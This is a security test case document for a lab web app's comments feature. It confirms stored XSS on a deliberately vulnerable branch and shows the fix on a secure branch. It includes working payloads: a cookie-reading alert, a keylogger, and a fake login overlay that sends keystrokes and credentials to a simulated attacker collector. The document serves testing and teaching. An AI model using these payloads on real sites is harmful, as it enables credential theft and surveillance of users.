# TC-XSS-01: Stored Cross-Site Scripting — Comments

## Identifier
TC-XSS-01

## Objective
Verify whether the comments feature (`/comments`, rendered on
`/dashboard`) is vulnerable to Stored XSS, and demonstrate the
practical impact of a successful injection (data exfiltration,
credential phishing, keystroke logging).

## Preconditions
- Application running locally, database initialized and seeded.
- Tester logged in as a normal user (`alice` / `password123`).

## Test Environment
- Branch under test: `vulnerable` (baseline) and `secure` (post-fix
  verification)
- Tool: browser (manual)

---

## Sub-scenario A — Baseline: normal comment (control test)

**Input:** content = `This is a normal comment.`

**Expected result:** Comment is stored and displayed as plain text
on `/dashboard`.

**Actual result (vulnerable branch):** As expected.

**Actual result (secure branch):** As expected — no regression.

---

## Sub-scenario B — Proof of concept

**Input:** content = `<script>alert('XSS')</script>`

**Expected result (vulnerable branch):** Because comment content is
rendered with Jinja2's `| safe` filter (disabling auto-escaping),
the browser parses the submitted string as real HTML rather than
text, and executes the embedded `<script>` tag.

**Actual result (vulnerable branch):** **Confirmed.** An `alert('XSS')`
dialog fires every time any user (not just the original poster)
loads `/dashboard`, for as long as the comment remains in the
database — confirming this is a *stored*, persistent vulnerability
rather than a one-off effect.

**Actual result (secure branch):** The `| safe` filter was removed;
Jinja2's default auto-escaping renders the payload as the literal,
inert text `<script>alert('XSS')</script>` on the page. No dialog
fires, and inspecting the page's DOM confirms no `<script>` element
is actually created — the text is escaped to `&lt;script&gt;...`.

---

## Sub-scenario C — Session cookie disclosure attempt

**Input:** content = `<script>alert(document.cookie)</script>`

**Expected result (vulnerable branch):** If the session cookie is
readable via JavaScript, its value would be disclosed via the alert
dialog.

**Actual result (vulnerable branch):** The dialog fired but displayed
an **empty string** — the session cookie was not readable via
`document.cookie`. Investigation confirmed Flask sets the session
cookie with the `HttpOnly` flag by default, which explicitly blocks
JavaScript access to that cookie regardless of any XSS vulnerability
present. This is a secondary, independent defense layer that limited
(but did not eliminate) the impact of the underlying XSS flaw.

**Actual result (secure branch):** N/A (payload is escaped, does not
execute; the `HttpOnly` observation from the vulnerable branch is
noted here as a documented finding, not a fix specific to this
branch — `HttpOnly` was already the default in both).

**Conclusion:** This sub-scenario demonstrates that a single security
control (proper output escaping) is not the only factor governing
real-world impact — layered/defense-in-depth settings such as
`HttpOnly` can independently reduce the practical damage of an XSS
vulnerability, even before the root cause is fixed. It does not
reduce the severity of the underlying flaw, which remains fully
exploitable for other purposes (see Sub-scenarios D and E).

---

## Sub-scenario D — Keystroke logging

**Input:** content =
```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('/debug/collector?data=key:' + encodeURIComponent(e.key));
});
</script>
```

**Expected result (vulnerable branch):** Every keypress made by any
user viewing the comments page is silently sent, in real time, to
the lab's simulated collector endpoint (`/debug/collector`, a
stand-in for a real attacker-controlled server, see
`app/routes/comments.py`).

**Actual result (vulnerable branch):** **Confirmed.** Typing "hello"
elsewhere on the page produced sequential entries `key:h`, `key:e`,
`key:l`, `key:l`, `key:o` on `/debug/collector-log`.

**Actual result (secure branch):** Payload does not execute (escaped
as text); no entries are produced on the collector log.

---

## Sub-scenario E — Credential phishing overlay

**Input:** content =
```html
<script>
document.body.innerHTML = `
  <div><h2>Session expired. Please log in again.</h2>
    <form id="phish">
      <input type="text" id="u" placeholder="Username">
      <input type="password" id="p" placeholder="Password">
      <button type="submit">Log in</button>
    </form>
  </div>`;
document.getElementById('phish').addEventListener('submit', function(e) {
  e.preventDefault();
  fetch('/debug/collector?data=' + encodeURIComponent(
    'creds:' + document.getElementById('u').value + ':' +
    document.getElementById('p').value));
});
</script>
```

**Expected result (vulnerable branch):** The entire visible page is
replaced with a fake "session expired" login form. Any credentials
entered are sent to the collector endpoint instead of being used for
an actual login.

**Actual result (vulnerable branch):** **Confirmed.** Submitting
`alice` / `password123` into the fake form produced the entry
`creds:alice:password123` on `/debug/collector-log` — full,
plaintext credential disclosure, entirely independent of the
`HttpOnly` cookie restriction observed in Sub-scenario C.

**Actual result (secure branch):** Payload does not execute; page
displays the literal script text, no overlay is rendered.

---

## Overall Conclusion

The `vulnerable` branch's comments feature is exploitable via Stored
XSS due to the unescaped (`| safe`) rendering of user-submitted
content. Demonstrated impact ranges from simple proof-of-concept
execution to real-time keystroke interception and full credential
phishing — the latter two succeeding independently of the `HttpOnly`
cookie protection that limited (but did not prevent) direct
session-cookie theft. Because the payload is persisted in the
database, every user who subsequently views the comments page is
affected, not only the original victim of a single request.

The `secure` branch's fix — removing the `| safe` filter and relying
on Jinja2's default auto-escaping — closes all tested attack paths.
Additionally, a Content-Security-Policy header (`script-src 'self'`)
was added as defense-in-depth on the `secure` branch, which would
independently block inline `<script>` execution even if an escaping
regression were reintroduced elsewhere in the future.
